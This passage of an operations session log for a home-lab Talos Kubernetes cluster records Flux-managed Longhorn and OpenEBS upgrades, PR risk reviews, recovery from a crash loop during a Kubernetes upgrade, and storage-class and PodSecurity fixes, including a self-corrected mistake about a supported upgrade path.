- **Suspend during failed retry**: When the 1.11.2 upgrade failed, `flux suspend hr longhorn` was used to stop the retry cycle immediately rather than waiting through 2 more 5-minute timeout+rollback cycles.
- **pr-upgrade-reviewer correction**: The agent stated direct 1.9→1.11 was "explicitly supported" — this was wrong. The manager's `checkLHUpgradePath` function rejects it. Memory note updated.

---

## 2026-05-13 — `pr-19-review`

### Goal
Review PR #19 (Longhorn 1.9.0 → 1.11.2) via the pr-upgrade-reviewer agent to assess upgrade risk before merging.

### What we did
- Fetched PR #19 (Renovate-generated, Longhorn 1.9.0 → 1.11.2, two minor version steps)
- Retrieved release notes across the full version chain (1.9.x → 1.10.x → 1.11.x)
- Identified two blocking issues:
  1. Missing `crds: CreateReplace` in both `install` and `upgrade` blocks of the HelmRelease (project convention violation and functional defect — CRD schemas have been frozen since first install)
  2. v1.10.0 permanently removed `v1beta1` API; storedVersions in etcd must be verified/migrated before the upgrade hook will allow proceeding, even when jumping directly to 1.11.2
- Identified medium risks: tight instance-manager memory limits (`64Mi`) may OOMKill under 1.11.x disk-health monitoring; stale values.yaml settings key (`orphanAutoDeletion`)
- Confirmed v1.11.2 images are published; K8s v1.36.x compatibility clear; rollback is complex but not a one-way migration

### Files changed
| File | Change |
|------|--------|
| `docs/SESSIONS.md` | Added this session entry |
| `CLAUDE.md` | Added session row to log table |

### Key decisions
- Verdict: do not merge PR #19 until `crds: CreateReplace` is added to the HelmRelease and the v1beta1 storedVersions check passes on the live cluster

---

## 2026-05-13 — `openebs-4.4.0-upgrade`

### Goal
Verify the OpenEBS 4.3.2 → 4.4.0 minor upgrade (PR #18) reconciled cleanly after merge.

### What we did
- Reviewed PR #18 via `pr-upgrade-reviewer` agent — assessed as low-risk (LocalPV Hostpath only; all other engines disabled)
- Merged PR #18; confirmed Flux had not yet picked up the new tag (OCIRepository still at 4.3.2 on 1h interval)
- Force-reconciled the chain: `flux reconcile source git flux-system` → `flux reconcile ks cluster-meta --with-source`
- OCIRepository updated to `4.4.0`, cosign signature verified
- HelmRelease upgraded to `openebs/openebs.v2` with chart `openebs@4.4.0` (`UpgradeSucceeded`)
- `openebs-localpv-provisioner` pod recycled cleanly (0 restarts, label `chart=localpv-provisioner-4.4.0`)

### Files changed
| File | Change |
|------|--------|
| `kubernetes/flux/meta/repos/oci/openebs.yaml` | OCI tag bumped `4.3.2` → `4.4.0` (via PR #18) |

### Key decisions
- No pre-merge steps were needed; `crds: CreateReplace` already in place from the previous session meant CRD schema updates were handled automatically

---

## 2026-05-13 — `openebs-oci-source-fix`

### Goal
Diagnose and fix the broken `OCIRepository/openebs` source in `flux-system` so Flux can reconcile OpenEBS again (currently stuck with "does not have an artifact").

### What we did
- Inspected live cluster state: `OCIRepository/openebs` was actually Ready (artifact stored, cosign verified); the problem was in the `HelmRelease`
- Root cause: timing race — HelmRelease reconcile checked the OCIRepository at `12:45:08Z`, 30 seconds before the OCI artifact was stored at `12:45:38Z`; HelmRelease got stuck in `SourceNotReady` until its next 1h cycle
- Forced an immediate reconcile with `flux reconcile helmrelease openebs -n openebs` — resolved successfully (`applied revision 4.3.2`)
- Added missing `crds: CreateReplace` to both `install` and `upgrade` blocks in `helmrelease.yaml` (required by CLAUDE.md convention for operator charts that ship CRDs)
- Removed completed roadmap item; added entry to Completed table

### Files changed
| File | Change |
|------|--------|
| `kubernetes/apps/openebs/openebs/app/helmrelease.yaml` | Added `crds: CreateReplace` to `install` and `upgrade` blocks |
| `docs/ROADMAP.md` | Removed OpenEBS OCIRepository fix item from In Progress; added to Completed |

### Key decisions
- The OCIRepository timing race is inherent to async Flux controllers with matching 1h intervals; no structural fix is needed — `flux reconcile` is the correct operational response
- `crds: CreateReplace` is a correctness fix, not cosmetic — Helm silently leaves old CRD schemas in place on upgrade without it

---

## 2026-05-13 — `claude-md-session-lifecycle`

### What we did
- Added a mandatory `## Session Lifecycle` section to `CLAUDE.md` defining the open/close protocol
- Defined the stub format (slug, `### Goal`, separator) that must be prepended to `docs/SESSIONS.md` at session start
- Defined the close steps: replace Goal with `### What we did` + `### Files changed` + optional `### Key decisions`; update the CLAUDE.md session log table summary
- Added a note for interrupted sessions (stub is still useful — complete it next session under the same slug)
- Opened and closed this session as a live demonstration of the new workflow

### Files changed
| File | Change |
|------|--------|
| `CLAUDE.md` | Added `## Session Lifecycle` section; added `claude-md-session-lifecycle` row to session log table |
| `docs/SESSIONS.md` | Prepended this session stub; completed on close |

### Key decisions
- Placed Session Lifecycle as its own `##` section (not bullets inside "Working in This Repo") to make it prominent and easy to find via heading navigation
- Kept the stub format minimal — just a slug, date, and `### Goal` — so opening a session has near-zero friction

---

## 2026-05-13 — `kubernetes-upgrade-v1.35-v1.36`

### What we did
- Executed the v1.35.4 upgrade using the manual staggered approach (Phase 2: `talosctl patch mc`
  per node, 2-minute stable-PID verification; Phase 3: `upgrade-k8s` for remaining components)
- Fixed a pre-existing `KubernetesUpgrade` CRD stuck in `Upgrading` phase targeting v1.33.11
  (result of a prior revert commit that Flux reconciled before the re-upgrade commit was pushed;
  the CRD's admission webhook blocked Flux from updating the spec while Upgrading was in progress)
- Executed the v1.36.0 upgrade using the tuppr-native path (merged Renovate PR #13; tuppr ran
  `upgrade-k8s` automatically via a job pod; no manual steps required; validated as safe)
- Documented two operational patterns in QA.md: the `KubernetesUpgrade` mismatch/cleanup pattern
  (manual upgrade-ahead-of-Git) and the v1.34.7 crash loop root cause (gRPC etcd connection flood)
- Added Kubernetes upgrade operational rules to CLAUDE.md (preferred tuppr-native path, manual
  fallback procedure, KubernetesUpgrade cleanup command)
- Removed `TROUBLESHOOTING.md` (session-scoped runbook); all durable knowledge migrated to
  `QA.md` and `CLAUDE.md`
- Updated `scripts/mcp.sh` for reliable MCP token management

### Files changed
| File | Change |
|------|--------|
| `talos/talenv.yaml` | `kubernetesVersion`: v1.34.7 → v1.35.4 → v1.36.0 |
| `kubernetes/apps/system-upgrade/tuppr/upgrade/kubernetesupgrade.yaml` | `spec.kubernetes.version`: v1.34.7 → v1.35.4 → v1.36.0 |
| `QA.md` | Added: tuppr downgrade-job mismatch pattern; v1.34.7 crash loop root cause |
| `CLAUDE.md` | Expanded upgrade-path bullet with operational rules; added session log entries |
| `TROUBLESHOOTING.md` | Removed (content migrated to QA.md and CLAUDE.md) |
| `scripts/mcp.sh` | Updated by user for reliable MCP token management |

### Key decisions
- **tuppr-native path is preferred** for all future Kubernetes minor upgrades: merge the Renovate
  PR and let tuppr handle it. Manual `patch mc` only needed if a crash loop is observed on the
  first node patched.
- **KubernetesUpgrade mismatch cleanup**: if you ever run `upgrade-k8s` manually ahead of Git,
  delete the `KubernetesUpgrade` resource before Flux reconcile to avoid the downgrade-job loop.

---

## 2026-05-13 — `kubernetes-upgrade-v1.34-crash-recovery`

### What we did
- Diagnosed cluster fully down: all 3 apiservers still on v1.34.7 and crash-looping (not reverted
  as expected from the prior session's runbook); VIP (10.60.0.2) down; etcd healthy throughout
- Root cause: `kube-apiserver v1.34.7` opens ~100 gRPC channels to etcd simultaneously at startup,
  overwhelming TLS handshake queue → `rbac/bootstrap-roles` PostStartHook fatal timeout; three
  nodes upgraded simultaneously caused synchronised backoff waves preventing recovery
- Reverted all 3 apiservers to v1.33.11 via staggered `talosctl patch mc` (one node at a time,
  strategic merge form); removed removed feature gates (`MutatingAdmissionPolicy`, `v1alpha1`
  runtime-config) from `talos/patches/controller/cluster.yaml`
- Re-upgraded to v1.34.7 using same staggered approach with 2-minute stable-PID verification
  per node; cluster recovered successfully
- Wrote `TROUBLESHOOTING.md` as the v1.35.4 forward-looking upgrade runbook (later removed this
  session and migrated content to QA.md)

### Files changed
| File | Change |
|------|--------|
| `talos/patches/controller/cluster.yaml` | Removed `MutatingAdmissionPolicy=true` and `admissionregistration.k8s.io/v1alpha1` feature gates |
| `talos/talenv.yaml` | v1.34.7 → v1.33.11 (revert) → v1.34.7 (re-upgrade) |
| `kubernetes/apps/system-upgrade/tuppr/upgrade/kubernetesupgrade.yaml` | same version churn |
| `kubernetes/apps/system-upgrade/tuppr/upgrade/talosupgrade.yaml` | corrected stale v1.10.6 → v1.13.0 |

---

## 2026-05-13 — `longhorn-psa-fix`

### What we did
- Diagnosed Longhorn as completely non-functional as a CSI provider due to missing PodSecurity
  Admission (PSA) namespace label on `longhorn-system`
- Kubernetes PSA was enforcing the `baseline` policy on unlabelled namespaces; Longhorn requires
  `privileged` because its core components use `securityContext.privileged=true`, `SYS_ADMIN`
  capability, and `hostPath` volumes (required for CSI mount operations)
- Root cause: the `longhorn-system` namespace manifest in Git lacked
  `pod-security.kubernetes.io/enforce: privileged`; the label is not set automatically by the
  Longhorn Helm chart — it must be declared on the namespace resource in Git
- Diagnosis performed by cluster-doctor agent (read-only); agent identified PSA as the
  single root error via pod events (`FailedCreate` on `longhorn-csi-plugin` DaemonSet), confirmed
  by the cascade: no CSI socket → all CSI sidecars (attacher, provisioner, resizer, snapshotter)
  in CrashLoopBackOff; only cp-02 instance-manager survived (predated enforcement trigger)
- **No PVCs existed** — no data was at risk
- Fixed by adding `pod-security.kubernetes.io/enforce/warn/audit: privileged` to `namespace.yaml`;
  setting all three levels ensures audit/warn visibility as well as enforcement parity
- Fix survives Flux reconciliation because the label is declared in the namespace manifest in Git
  (Flux drift detection would overwrite any imperatively-added label)

### Probable trigger
The Kubernetes version revert (`e49c556`, `v1.34.7 → v1.33.11`) likely left a stricter cluster-level
PSA default than was previously active. The namespace label was never in Git — the Helm chart
doesn't set it — and the deployment appeared to work before because PSA was not previously
enforcing `baseline` as the cluster default.

### Files changed
| File | Change |
|------|--------|
| `kubernetes/apps/longhorn-system/longhorn/app/namespace.yaml` | Add PSA `enforce/warn/audit: privileged` labels |

---

## 2026-05-12 — `talos-upgrade-v1.10-to-v1.13`

### What we did
- Analysed Renovate PR for `ghcr.io/siderolabs/installer` (`v1.10.6 → v1.13.1`); determined safe
  incremental path: `v1.10.6 → v1.11.6 → v1.12.7 → v1.13.0`
  - `v1.13.1` was a git tag but not a published GitHub release or Docker image — Renovate tracked
    the tag; closed/ignored in favour of targeting `v1.13.0` (latest actual release)
- **Fixed Taskfile bug** in `talos:upgrade-node`: `--image` was passed twice — once by
  `talhelper gencommand upgrade` (correct, with `:v<version>` tag) and once via `--extra-flags`
  (versionless, would override via cobra last-wins). Removed the redundant `--extra-flags` image
  arg and the now-unused `TALOS_IMAGE` var
- **Fixed `admission-controller-patch.yaml`**: was a JSON RFC 6902 `op: remove` patch; Talos v1.12
  introduced multi-document machine configs and talhelper now rejects JSON 6902 patches for them.
  Converted to strategic merge patch (`admissionControl: []`)
- Upgraded all 3 nodes through each hop one at a time (preserving etcd quorum); used
  `mise exec talosctl@<current-server-version>` for each hop; confirmed ±1 minor version skew
  is fine (ENHANCE_YOUR_CALM only occurs beyond ±1 minor)
- Cluster now fully on Talos `v1.13.0`, kernel `6.18.24-talos`, containerd `2.2.3`

### Files changed
| File | Change |
|------|--------|
| `talos/talenv.yaml` | `talosVersion`: `v1.10.6` → `v1.13.0` |
| `.taskfiles/talos/Taskfile.yaml` | `upgrade-node`: remove redundant `--image` extra-flag and `TALOS_IMAGE` var |
| `talos/patches/controller/admission-controller-patch.yaml` | Convert JSON 6902 `op: remove` to strategic merge `admissionControl: []` |

---

## 2026-05-12 — `purge-failed-pods-script`

### What we did
- Created `scripts/purge-failed-pods.sh` — walks the ownership chain (Pod → ReplicaSet →
  Deployment/DaemonSet/StatefulSet), verifies controller health before deleting, and defaults to
  dry-run mode; pass `--delete` to apply
- Added `task purge-failed-pods` to root `Taskfile.yaml` with `DELETE=true` var mirroring the
  script flag; follows the same `VAR=value` convention as `INSECURE=true` in `talos:apply`
- Updated `QA.md` — extended the Cluster Recovery / Unclean Shutdown fix section with a reference
  to the script, the task invocation, and the health criteria used per controller kind

### Files changed
| File | Change |
|------|--------|
| `scripts/purge-failed-pods.sh` | NEW — dry-run/live pod cleanup script |
| `Taskfile.yaml` | Add `purge-failed-pods` task |
| `QA.md` | Extend unclean-shutdown fix section with script/task reference |

---

## 2026-05-12 — `tuppr-upgrade-controller-deployment`

### What we did
- Researched automated Talos + Kubernetes upgrade tooling; selected **tuppr** (home-operations/tuppr
  v0.1.26) as the community-standard GitOps-native successor to the archived `jfroy/tnu`
- Deployed tuppr: OCIRepository source, Flux Kustomization pair, HelmRelease with `crds:
  CreateReplace`, `TalosUpgrade` + `KubernetesUpgrade` CRD instances pinned to current running
  versions (v1.10.6 / v1.33.4) — upgrades are idle until Renovate bumps them
- Updated Renovate config: removed `installer` + `kubelet` from `ignoreDeps`; replaced single
  grouped rule with two separate `separateMinorPatch: true` rules to prevent dangerous minor-skip PRs
- **Fixed two rollout errors discovered during live reconciliation:**
  1. **cosign verification failure** — copied `verify: provider: cosign` from openebs OCIRepository
     without checking; `charts/` (first-party) is unsigned, only `charts-mirror/` is cosign-signed;
     required patching the live OCIRepository resource directly to break cluster-meta's frozen
     health-check before flux reconcile could proceed
  2. **CRD chicken-and-egg dry-run failure** — `TalosUpgrade`/`KubernetesUpgrade` instances were
     in the same Kustomization as the HelmRelease; Flux dry-runs all resources before applying any,
     so the CRD types didn't exist yet; fixed by splitting into two Kustomizations with `dependsOn`
- Researched `.archive` for CRD ordering patterns; confirmed split-Kustomization + `dependsOn` is
  the canonical approach; refactored to archive convention of multi-document `ks.yaml`
- Added five Q&A entries to `QA.md`: CRD chicken-and-egg, `crds: CreateReplace`, cosign registry
  split, `valuesFrom` + configMapGenerator + kustomizeconfig.yaml, Renovate minor vs patch PRs
- Added ToC to `QA.md`

### Files changed
| File | Change |
|------|--------|
| `kubernetes/flux/meta/repos/oci/tuppr.yaml` | NEW — OCIRepository for tuppr chart (no cosign) |
| `kubernetes/flux/meta/repos/oci/kustomization.yaml` | Add tuppr.yaml |
| `kubernetes/apps/system-upgrade/kustomization.yaml` | NEW — namespace-level entry-point |
| `kubernetes/apps/kustomization.yaml` | Add system-upgrade |
| `kubernetes/apps/system-upgrade/tuppr/ks.yaml` | NEW — multi-doc: tuppr + tuppr-upgrade Kustomizations |
| `kubernetes/apps/system-upgrade/tuppr/app/kustomization.yaml` | NEW — configMapGenerator + helmrelease |
| `kubernetes/apps/system-upgrade/tuppr/app/namespace.yaml` | NEW |
| `kubernetes/apps/system-upgrade/tuppr/app/helmrelease.yaml` | NEW — `crds: CreateReplace` |
| `kubernetes/apps/system-upgrade/tuppr/app/helm/values.yaml` | NEW |
| `kubernetes/apps/system-upgrade/tuppr/app/helm/kustomizeconfig.yaml` | NEW — valuesFrom name rewrite |
| `kubernetes/apps/system-upgrade/tuppr/upgrade/kustomization.yaml` | NEW |
| `kubernetes/apps/system-upgrade/tuppr/upgrade/talosupgrade.yaml` | NEW — v1.10.6, parallelism: 1 |
| `kubernetes/apps/system-upgrade/tuppr/upgrade/kubernetesupgrade.yaml` | NEW — v1.33.4 |
| `renovate.json5` | Remove installer+kubelet from ignoreDeps; add per-package separateMinorPatch rules |
| `talos/patches/controller/machine-features.yaml` | Comment: system-upgrade-controller → tuppr |
| `QA.md` | Add ToC; add 5 new entries covering rollout lessons |

### Notes
- Cluster bootstraps cleanly from current repo state: `dependsOn` ordering guarantees CRDs are
  registered before instances are applied on a fresh install
- Next Renovate PRs for Talos/k8s will target `talosupgrade.yaml` and `kubernetesupgrade.yaml`;
  merge one minor at a time (Talos and Kubernetes both require sequential minor upgrades)

---

## 2026-05-12 — `qa-log-and-eth0-rename`

### What we did
- Explained the `eth0: renamed from tmp<random>` kernel messages visible in the Talos console on
  cp-03 — confirmed normal CNI behaviour (Cilium veth pair creation for pod networking), not errors
- Created `QA.md` — a persistent log of operational Q&A capturing cluster-specific behaviours
  that look alarming but aren't, plus actionable signals for when they would indicate a real problem
- Added a reference to `QA.md` in `CLAUDE.md` alongside the existing CLUSTER.md and SESSIONS.md pointers

### Files changed
| File | Change |
|------|--------|
| `QA.md` | NEW — operational Q&A log; first entry: eth0 rename messages |
| `CLAUDE.md` | Add `QA.md` reference in the intro doc-pointer block |

---

## 2026-05-12 — `storage-storageclasses-and-conventions`

### What we did
- Added `longhorn-retain` StorageClass — identical parameters to the default `longhorn` class but
  with `reclaimPolicy: Retain`; for stateful workloads where accidental PVC deletion must not
  silently destroy data (databases, media libraries)
- Added `longhorn-single` StorageClass — single replica, `reclaimPolicy: Retain`; for workloads
  that manage their own application-level replication (CloudNativePG streaming replication, Redis
  Sentinel) to avoid double replication overhead
- Added doc-comment convention to CLAUDE.md: all cluster YAML should carry comments explaining
  the *why* of non-obvious values, provisional settings, and operational implications
- Discussed and clarified: `Recreate` vs `RollingUpdate` for RWO PVCs; `longhorn` vs
  `longhorn-static` StorageClass differences; reclaim policy scoping (StorageClass vs PV);
  double replication trade-off with CNPG; `staleReplicaTimeout` behaviour

### Final StorageClass inventory
| StorageClass | Reclaim | Replicas | Use case |
|---|---|---|---|
| `longhorn` *(default)* | Delete | 2 | Ephemeral/replaceable volumes |
| `longhorn-retain` | Retain | 2 | Stateful workloads, irreplaceable data |
| `longhorn-single` | Retain | 1 | App-managed replication (CNPG, Redis Sentinel) |
| `longhorn-static` | Delete | — | Manual static binding / disaster recovery |
| `openebs-hostpath` | Delete | — | Node-local scratch volumes |

### Files changed
| File | Change |
|------|--------|
| `kubernetes/apps/longhorn-system/longhorn/app/storageclass-retain.yaml` | NEW |
| `kubernetes/apps/longhorn-system/longhorn/app/storageclass-single.yaml` | NEW |
| `kubernetes/apps/longhorn-system/longhorn/app/kustomization.yaml` | Add both new StorageClasses |
| `CLAUDE.md` | Add doc-comment convention under GitOps Conventions |

### Notes
- `numberOfReplicas: "2"` in both new StorageClasses must be bumped to `"3"` when cp-02 drive
  arrives (same trigger as the Longhorn HelmRelease values)
- `staleReplicaTimeout: 30` means replicas offline >30 min are rebuilt from scratch rather than
  incrementally re-synced; fine for home lab, raise to 120 for longer maintenance windows

---

## 2026-05-12 — `persistent-storage-deploy-and-fix`

### What we did
- Committed all prior session changes (3 commits: Talos prereqs, K8s app layer, docs) and pushed to origin
- Ran `task reconcile` — Flux pulled the new manifests and attempted to deploy both apps
- Diagnosed two errors:
  - **openebs**: `namespaces "openebs" not found` — `install.createNamespace: true` is a Helm directive and runs too late; Flux needs the namespace to already exist when it applies the HelmRelease CR
  - **longhorn**: `ConfigMap/longhorn-values namespace not specified` — configMapGenerator entry lacked an explicit `namespace: longhorn-system`
- Fixed both by adding explicit `Namespace` resources to each app's `app/` directory and wiring them into `kustomization.yaml`; also added `namespace: longhorn-system` to the configMapGenerator
- Pushed fix commit, reconciled — both HelmReleases installed successfully within ~30 seconds

### Result
- **OpenEBS**: `openebs-hostpath` StorageClass live (non-default, WaitForFirstConsumer)
- **Longhorn**: `longhorn` StorageClass live (default, WaitForFirstConsumer), 2-replica mode; full pod stack running on all 3 nodes
- **StorageClasses**: `longhorn` (default), `longhorn-static`, `openebs-hostpath`

### Files changed
| File | Change |
|------|--------|
| `kubernetes/apps/openebs/openebs/app/namespace.yaml` | NEW — explicit Namespace for openebs |
| `kubernetes/apps/openebs/openebs/app/kustomization.yaml` | Add `./namespace.yaml` to resources |
| `kubernetes/apps/longhorn-system/longhorn/app/namespace.yaml` | NEW — explicit Namespace for longhorn-system |
| `kubernetes/apps/longhorn-system/longhorn/app/kustomization.yaml` | Add `./namespace.yaml`; add `namespace: longhorn-system` to configMapGenerator |

### Remaining step (cp-02 drive)
When the Crucial P310 1TB 2230 arrives:
1. `talosctl get disks --nodes 10.60.0.202` → grab serial
2. Add inline `machine.disks` patch for cp-02 in `talos/talconfig.yaml` (matching cp-01/cp-03 by-id pattern)
3. `task talos:apply IP=10.60.0.202`
4. Set `allowScheduling: true` in `kubernetes/apps/longhorn-system/longhorn/app/node-configs/talos-cp-02.yaml`
5. Bump `defaultClassReplicaCount` and `defaultReplicaCount` from `2` → `3` in `kubernetes/apps/longhorn-system/longhorn/app/helm/values.yaml`

---

## 2026-05-07 — `persistent-storage-k8s-app-layer`

### What we did
- Created the full Flux GitOps app layer for **OpenEBS LocalPV** and **Longhorn** — both are now
  committed and ready to reconcile once pushed to the repo
- Added two new Flux sources to `kubernetes/flux/meta/repos/`:
  - `oci/openebs.yaml` — OCIRepository pointing to `ghcr.io/home-operations/charts-mirror/openebs`
    tag `4.3.2`, cosign-verified
  - `helm/longhorn.yaml` — HelmRepository pointing to `https://charts.longhorn.io`
- Created `kubernetes/apps/openebs/` — full Flux Kustomization + HelmRelease for OpenEBS LocalPV:
  - `openebs-hostpath` StorageClass, non-default, base path `/var/mnt/openebs/local` (EPHEMERAL)
  - All engines except `localpv-provisioner` disabled; no snapshot-controller dependency
- Created `kubernetes/apps/longhorn-system/` — full Flux Kustomization + HelmRelease + node-configs:
  - Chart pinned at `1.9.0` from the longhorn HelmRepository
  - `defaultClassReplicaCount: 2` and `defaultReplicaCount: 2` (provisional — cp-02 has no drive
    yet; bump both to 3 when Crucial P310 arrives)
  - talos-cp-01 and talos-cp-03 node-configs: `allowScheduling: true` (drives mounted)
  - talos-cp-02 node-config: `allowScheduling: false` (drive pending; won't attempt replica placement)
  - Values passed via configMapGenerator + `kustomizeconfig.yaml` nameReference pattern
  - `csi.kubeletRootDir: /var/lib/kubelet` (Talos requirement)
  - Control-plane tolerations on longhornManager, longhornDriver, longhornInstanceManager
- Wired up `kubernetes/apps/kustomization.yaml` — added `./openebs` and `./longhorn-system`
- Both Flux Kustomization CRs placed in `flux-system` namespace (not app namespaces) to avoid
  bootstrap chicken-and-egg: a CR in e.g. `openebs` namespace can't be stored before that
  namespace exists; `flux-system` always exists and HelmRelease uses `createNamespace: true`
- Both ks.yaml files carry `substitution.flux.home.arpa/disabled: "true"` to opt out of the
  cluster-apps postBuild substitution patch (cluster-settings/cluster-secrets don't exist yet)

### Files created / modified
| File | Change |
|------|--------|
| `kubernetes/flux/meta/repos/oci/openebs.yaml` | NEW — OCIRepository for openebs chart |
| `kubernetes/flux/meta/repos/oci/kustomization.yaml` | Added openebs |
| `kubernetes/flux/meta/repos/helm/longhorn.yaml` | NEW — HelmRepository for longhorn chart |
| `kubernetes/flux/meta/repos/helm/kustomization.yaml` | Added longhorn |
| `kubernetes/apps/kustomization.yaml` | Added `./openebs` and `./longhorn-system` |
| `kubernetes/apps/openebs/kustomization.yaml` | NEW — namespace-level kustomization |
| `kubernetes/apps/openebs/openebs/ks.yaml` | NEW — Flux Kustomization CR |
| `kubernetes/apps/openebs/openebs/app/kustomization.yaml` | NEW |
| `kubernetes/apps/openebs/openebs/app/helmrelease.yaml` | NEW — HelmRelease |
| `kubernetes/apps/longhorn-system/kustomization.yaml` | NEW — namespace-level kustomization |
| `kubernetes/apps/longhorn-system/longhorn/ks.yaml` | NEW — Flux Kustomization CR |
| `kubernetes/apps/longhorn-system/longhorn/app/kustomization.yaml` | NEW — configMapGenerator |
| `kubernetes/apps/longhorn-system/longhorn/app/helmrelease.yaml` | NEW — HelmRelease |
| `kubernetes/apps/longhorn-system/longhorn/app/helm/values.yaml` | NEW — Longhorn values |
| `kubernetes/apps/longhorn-system/longhorn/app/helm/kustomizeconfig.yaml` | NEW — nameReference |
| `kubernetes/apps/longhorn-system/longhorn/app/node-configs/talos-cp-01.yaml` | NEW |
| `kubernetes/apps/longhorn-system/longhorn/app/node-configs/talos-cp-02.yaml` | NEW — `allowScheduling: false` |
| `kubernetes/apps/longhorn-system/longhorn/app/node-configs/talos-cp-03.yaml` | NEW |

### Decisions made

**Flux Kustomization CRs in `flux-system`, not app namespaces**
On a fresh cluster, placing a Flux Kustomization CR in e.g. `longhorn-system` fails because
that namespace doesn't exist yet — the CR cannot be stored. Keeping all CRs in `flux-system`
(which always exists) and relying on `HelmRelease.install.createNamespace: true` eliminates
the bootstrapping deadlock entirely.

**No `spec.targetNamespace` on Longhorn Kustomization**
Longhorn's node-config files contain `kind: Node` objects, which are cluster-scoped (no
namespace). Setting `targetNamespace` would cause Kustomize to inject a namespace onto them,
which the Kubernetes API server rejects. Each resource declares its own namespace explicitly.

**`defaultClassReplicaCount: 2` until cp-02 hardware arrives**
With only 2 nodes having storage disks, a 3-replica PVC cannot be scheduled. Setting to 2
means Longhorn can provision volumes immediately on cp-01/cp-03. When cp-02's Crucial P310
1TB 2230 is installed, update both `defaultClassReplicaCount` and `defaultReplicaCount` to 3
and flip `allowScheduling: true` in `node-configs/talos-cp-02.yaml`.

### Next steps when resuming
1. `git push` → Flux will reconcile and deploy OpenEBS and Longhorn
2. Verify: `kubectl get helmrelease -A` and `kubectl get storageclass`
3. Test with a PVC against `openebs-hostpath` and `longhorn` storage classes
4. When cp-02's Crucial P310 arrives:
   - `talosctl get disks --nodes 10.60.0.202` → grab serial
   - Add inline `machine.disks` patch for cp-02 in `talos/talconfig.yaml`
   - `task talos:apply IP=10.60.0.202`
   - Set `allowScheduling: true` in `node-configs/talos-cp-02.yaml`
   - Bump `defaultClassReplicaCount` and `defaultReplicaCount` to `3` in `helm/values.yaml`

---

## 2026-05-07 — `persistent-storage-talos-prereqs`

### What we did
- Decided on dual storage tier: **OpenEBS LocalPV** (node-local, no replication) + **Longhorn** (3-replica HA) — complementary, not redundant
- Added `siderolabs/iscsi-tools` and `siderolabs/util-linux-tools` to `talos/schematic.yaml`
- Added per-node inline `machine.disks` patches to `talconfig.yaml` for cp-01 and cp-03 using
  `/dev/disk/by-id/` serial-based paths (more robust than device-path selectors)
- Diagnosed cp-02's missing storage disk — confirmed physically not installed (Crucial P310 1TB
  2230 + M.2 A/E adapter ordered; not a hardware fault, just not yet installed)
- Re-registered schematic at factory.talos.dev → new ID:
  `1aaf751348ca0f837eca199fa21933d3375641d972f9fb0d816e7bf87c81f1fc`
- Rolling apply + upgrade across all three nodes (one at a time to preserve etcd quorum):
  - cp-01: config applied with reboot (disk patch diff); then OS upgraded; `ext-iscsid` confirmed started; `/var/mnt/longhorn-storage` mounted XFS on `/dev/nvme1n1p1`
  - cp-02: config applied without reboot (no disk patch); OS upgraded; `ext-iscsid` confirmed started
  - cp-03: config applied with reboot (disk patch diff); then OS upgraded; disk enumeration swapped
    (nvme0n1 ↔ nvme1n1) but by-id path targeted the correct Crucial drive — `/var/mnt/longhorn-storage`
    mounted XFS on `/dev/nvme0n1p1` (2 TB Crucial, now enumerated as nvme0n1)
- Fixed bug in `bootstrap:cluster`: shell `task talos:genconfig` calls replaced with `task:` map
  references; `dir:` removed from the task; all paths made absolute — prevents spurious `talos/talos/`
  directory creation caused by CWD ambiguity when subtasks were called as shell subprocesses
- Removed stale `talos/talos/clusterconfig/` artifact (empty talosconfig left by the bug above)
- Updated `CLUSTER.md` disk inventory with correct drive models, by-id paths, and cp-02 status
- Used `talosctl@1.10.6` (via `mise exec`) for upgrade commands — required due to client (1.13.0) /
  server (1.10.6) version mismatch causing `ENHANCE_YOUR_CALM` gRPC errors with the default client

### Files created / modified
| File | Change |
|------|--------|
| `talos/schematic.yaml` | Enabled `iscsi-tools` and `util-linux-tools` extensions |
| `talos/talconfig.yaml` | Per-node inline `machine.disks` patches for cp-01 (IRP-SSDPR serial `G4E004578`) and cp-03 (CT2000P310SSD8 serial `252450B1A33B`) |
| `talos/talenv.yaml` | Auto-updated by `task talos:iso` with new schematic `talosImageURL` |
| `CLUSTER.md` | Corrected disk inventory: GoodRam IRDM PRO NANO on cp-01 (via M.2 A/E adapter), Crucial P310 on order for cp-02, Crucial CT2000P310SSD8 on cp-03; by-id paths documented |
| `ROADMAP.md` | Updated hardware snapshot; moved Persistent Storage to In Progress |
| `.taskfiles/bootstrap/Taskfile.yaml` | Fixed `bootstrap:cluster`: shell `task` calls → `task:` references; `dir:` removed; gensecret command uses absolute `{{.TALOS_DIR}}` paths throughout |

### Decisions made

**Per-node by-id serial paths over global `/dev/nvme1n1`**
A global patch using the device path would have partitioned the wrong disk on cp-03 when its
NVMe enumeration order swapped after the upgrade (AirDisk and Crucial switched positions). Serial-
based `/dev/disk/by-id/nvme-<MODEL>_<SERIAL>` paths are stable across enumeration changes and are
the correct approach for bare-metal NVMe on any multi-drive node.

**cp-02 Longhorn deployment gated on drive arrival**
cp-02 has no storage disk installed. Longhorn 3-replica requires a disk on all three nodes to
place replicas. cp-02 will be configured when the Crucial P310 1TB 2230 arrives: run
`talosctl get disks --nodes 10.60.0.202`, grab the serial, add an inline patch matching cp-01/cp-03
pattern, then `task talos:apply IP=10.60.0.202` (no upgrade needed — already on the new schematic).

**OpenEBS can deploy immediately; Longhorn waits for cp-02**
OpenEBS LocalPV needs no dedicated disk — it uses EPHEMERAL hostpath. It can be deployed now
to unblock node-local workloads. Longhorn HelmRelease can be committed to Git now; it will just
sit unscheduled on cp-02 until the disk lands.

### Lessons learned

**go-task: always use `task:` map syntax for subtask invocations, never shell `task` commands**
When a task has `dir:` set and calls subtasks as shell commands (`- task foo`), the `task` binary
is spawned as a subprocess inheriting the modified CWD. Depending on go-task version and how
ROOT_DIR is resolved from that CWD, relative path variables can double up (e.g., `talos/talos/`).
Using `- task: foo` (map key syntax) invokes the subtask directly within go-task's own process —
no subprocess, no CWD ambiguity, variables always resolved from the root Taskfile.

**NVMe enumeration can change across reboots even without hardware changes**
cp-03's nvme0n1 (AirDisk) and nvme1n1 (Crucial) swapped after the upgrade reboot. Device paths
are not stable on bare-metal NVMe. `installDiskSelector: model:` and `machine.disks: device: /dev/disk/by-id/`
are the two stable mechanisms in Talos — use them everywhere, never raw `/dev/nvme*` paths.

**`talosctl disks` deprecated in newer clients; use `talosctl get disks`**
The `talosctl disks` subcommand is deprecated in Talos 1.10+ clients and exits with code 1.
Use `talosctl get disks` (or `talosctl get discoveredvolumes` for partition-level detail).

---

## 2026-05-07 — `etcd-learner-recovery-and-toolchain`

### What we did
